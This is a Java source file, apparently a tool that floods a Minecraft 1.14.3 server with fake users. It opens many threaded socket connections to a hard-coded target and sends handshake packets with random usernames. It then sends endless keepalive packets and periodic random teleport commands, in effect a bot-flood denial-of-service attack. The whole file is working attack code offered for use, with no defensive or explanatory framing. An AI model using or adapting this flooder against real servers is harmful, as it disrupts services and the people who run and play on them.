import command.TpCommand;
import model.FuckTarget;
import org.apache.commons.lang3.RandomStringUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import static util.HexUtil.*;

/**
 * 假用户轰炸 for Minecraft Server 1.14.3
 * @author crt106 on 2019/8/10.
 */
class FakeUserFuck {

    private static BlockingQueue blockingQueue = new ArrayBlockingQueue(100);
    private static ThreadPoolExecutor t = new ThreadPoolExecutor(100, 100, 1500, TimeUnit.MILLISECONDS, blockingQueue);

    public static void main(String[] args) {

        Runnable mainFuck = () -> {
            try {
                FuckTarget fuckTarget = FuckTarget.CRT;
                Socket socket = new Socket(fuckTarget.getIp(), fuckTarget.getPort());
                OutputStream os = socket.getOutputStream();
                InputStream in = socket.getInputStream();
                if (os != null) {
                    String rHex = getRandomUserHex(8);
                    sendHex(os, "");
                    sendHex(os, fuckTarget.getHexhead() + rHex);
                    ReadOne(in);
                    startWrite(os);
                }
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
        };
        initTask(mainFuck);

        while (true) {
            if (t.getActiveCount() < 20) {
                t.execute(mainFuck);
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    private static void initTask(Runnable r) {

        for (int i = 0; i < 30; i++) {
            t.execute(r);
            try {
                Thread.sleep(400);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }



    private static byte[] ReadOne(InputStream in) {
        try {
            byte[] b = new byte[1024];
            in.read(b);
            return b;
        } catch (IOException e) {
            e.printStackTrace();
            return new byte[1024];
        }
    }

    private static void startRead(InputStream in) {
        Runnable r = () -> {
            byte[] b = new byte[1024];
            while (true) {
                try {
                    in.read(b);
                    String bstr = new String(b);
                    System.out.println("Read:" + bstr);
                    b = new byte[1024];
                    Thread.sleep(500);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        Thread t = new Thread(r);
        t.start();
    }

    private static void startWrite(OutputStream os) {
        Runnable r = () -> {
            int tpcount = 0;
            while (true) {
                try {
                    sendHex(os, "");
                    tpcount++;
                    System.out.println("write one blank");
                    //执行tp动作
                    if (tpcount == 20) {
                        TpCommand tp = TpCommand.Companion.randomTp();
                        sendHex(os, tp.toHexString());
                        tpcount = 0;
                        System.out.println("write tp command");
                    }
                    Thread.sleep(100);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        t.execute(r);
    }

    private static void sendHex(OutputStream os, String hexStr) {
        try {
            os.write(hexStrToBinaryStr(hexStr));
            os.flush();
            System.out.println("Write:" + hexStr);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}
